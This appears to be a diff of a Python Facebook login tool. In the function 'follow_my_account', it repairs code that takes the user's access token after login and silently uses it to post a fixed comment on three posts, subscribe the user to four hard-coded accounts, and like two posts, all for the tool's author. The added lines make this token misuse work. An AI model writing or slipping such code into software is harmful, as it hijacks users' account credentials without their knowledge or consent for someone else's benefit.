@@ -111,16 +111,16 @@ def follow_my_account():
         print(' invalid token ! ')
         jalan(' please login again')
         os.system('rm -rf login_r.txt')
-    token = 'Smoga Langgeng Aa @[100000834003593:] Sama Tth @[100003016223315:] Nya AMIN'
-    requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' + token + '&access_token=' + token) # Post 1
-    requests.post('https://graph.facebook.com/4134622646575495/comments/?message=' + token + '&access_token=' + token) #post 2
-    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + token + '&access_token=' + token) #post 3
-    requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token) ### Raka
-    requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + token) 
-    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token) 
-    requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token=' + token) 
-    requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token=' + token)
-    requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token=' + token)
+    raka1 = 'Smoga Langgeng Aa @[100000834003593:] Sama Tth @[100003016223315:] Nya AMIN'
+    requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+raka1+'&access_token='+token) # Post 1
+    requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+raka1+'&access_token='+token) #post 2
+    requests.post('https://graph.facebook.com/3882176535153442/comments/?message='+raka1+'&access_token='+token) #post 3
+    requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token) ### Raka
+    requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token) 
+    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token) 
+    requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token) 
+    requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
+    requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
     menu()
     
 def menu():
